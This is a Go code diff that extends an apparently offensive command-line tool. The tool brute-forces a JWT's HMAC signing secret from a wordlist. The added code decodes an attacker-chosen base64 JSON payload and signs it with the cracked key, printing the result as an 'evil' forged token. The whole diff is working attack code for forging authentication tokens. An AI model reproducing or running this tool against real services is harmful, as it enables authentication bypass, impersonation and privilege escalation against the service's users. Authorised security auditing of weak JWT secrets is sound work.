@@ -2,10 +2,13 @@ package main
 
 import (
 	"bufio"
+	"encoding/base64"
+	"encoding/json"
 	"flag"
 	"fmt"
 	"log"
 	"os"
+	"strings"
 	"time"
 
 	"github.com/golang-jwt/jwt/v5"
@@ -21,7 +24,7 @@ var BrightCyan = "\x1b[96m"
 
 var verbosePtr *bool
 
-func validateSignature(tokenString string, secretKey []byte) (bool, string) {
+func validateSignature(tokenString string, secretKey []byte) (bool, []byte) {
 
 	token, _ := jwt.Parse(tokenString, func(t *jwt.Token) (interface{}, error) {
 		if _, ok := t.Method.(*jwt.SigningMethodHMAC); !ok {
@@ -31,13 +34,13 @@ func validateSignature(tokenString string, secretKey []byte) (bool, string) {
 	})
 
 	if token.Valid {
-		return true, string(secretKey)
+		return true, secretKey
 	}
 
-	return false, ""
+	return false, []byte("")
 }
 
-func bruteForce(wordlistPath string, jwt string) (string, float64) {
+func bruteForce(wordlistPath string, jwt string) ([]byte, float64) {
 
 	file, err := os.Open(wordlistPath)
 	if err != nil {
@@ -62,7 +65,7 @@ func bruteForce(wordlistPath string, jwt string) (string, float64) {
 		isJwtValid, _ := validateSignature(jwt, []byte(scanner.Text()))
 		if isJwtValid {
 			duration := time.Since(start).Seconds()
-			return string([]byte(scanner.Text())), duration
+			return []byte(scanner.Text()), duration
 		}
 	}
 
@@ -70,12 +73,43 @@ func bruteForce(wordlistPath string, jwt string) (string, float64) {
 		log.Fatal(err)
 	}
 
-	return "", 0.0
+	return []byte(""), 0.0
+}
+
+func generateToken(payload map[string]interface{}, secretKey []byte) string {
+
+	token := jwt.NewWithClaims(jwt.SigningMethodHS256, jwt.MapClaims(payload))
+
+	tokenString, err := token.SignedString(secretKey)
+	if err != nil {
+		log.Fatal(err)
+	}
+
+	return tokenString
+}
+
+func decodePayload(payload string) map[string]interface{} {
+
+	payloadDecoded, err := base64.RawURLEncoding.DecodeString(payload)
+	if err != nil {
+		log.Fatal(err)
+	}
+
+	var mapJson map[string]interface{}
+
+	errJson := json.Unmarshal([]byte(payloadDecoded), &mapJson)
+	if errJson != nil {
+		log.Fatal("Error unmarshaling JSON", errJson)
+	}
+
+	return mapJson
 }
 
 func main() {
 
 	var jwtToken string
+	var choice string
+	var payload string
 
 	verbosePtr = flag.Bool("v", false, "verbose mode")
 	pathToWordlist := flag.String("w", "", "path to wordlist")
@@ -88,4 +122,14 @@ func main() {
 	fmt.Printf("%v\n[✔] Secret Key Found! %v %v %v %v\n", Green, EndColor, Yellow, string(secretFound), EndColor)
 	fmt.Printf("Finished in %.2f seconds.\n\n", duration)
 
+	fmt.Printf("%vDo you want to generate a new JWT with a new payload? [Y/n]: %v", Magenta, EndColor)
+	fmt.Scanln(&choice)
+
+	if strings.ToLower(choice) == "y" {
+		fmt.Println("Enter new Payload: ")
+		fmt.Scanln(&payload)
+		decodedPayload := decodePayload(payload)
+		evilJwt := generateToken(decodedPayload, secretFound)
+		fmt.Printf("%v\n[✔] New JWT: %v %v %v %v\n", Red, EndColor, BrightBlue, string(evilJwt), EndColor)
+	}
 }
